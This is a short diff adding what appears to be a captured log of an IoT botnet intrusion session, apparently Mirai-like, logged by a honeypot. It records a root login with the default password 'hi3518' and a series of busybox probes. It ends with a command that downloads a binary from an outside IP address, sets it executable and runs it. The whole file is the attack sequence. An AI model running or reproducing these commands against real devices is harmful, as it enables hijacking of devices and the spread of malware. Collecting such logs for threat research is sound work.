@@ -1,0 +1,12 @@
+from: 109.105.251.136:33219 user:root password:hi3518
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox MRALM
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox MRALM
+tftp; wget; /bin/busybox MRALM
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox MRALM
+rm .s; wget http://114.34.25.245:53817/.i; chmod 777 .i; ./.i; exit
+q
